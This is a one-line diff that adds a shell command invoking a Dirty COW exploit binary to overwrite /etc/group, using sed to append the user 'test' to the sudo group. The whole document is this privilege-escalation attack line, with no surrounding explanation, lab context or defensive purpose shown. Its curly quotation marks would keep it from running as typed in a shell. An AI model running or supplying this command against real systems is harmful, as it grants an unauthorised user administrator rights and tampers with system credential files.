@@ -1,0 +1,1 @@
+./dirtycow /etc/group “$(sed ‘/\(sudo*\)/ s/$/,test/’ /etc/group)”
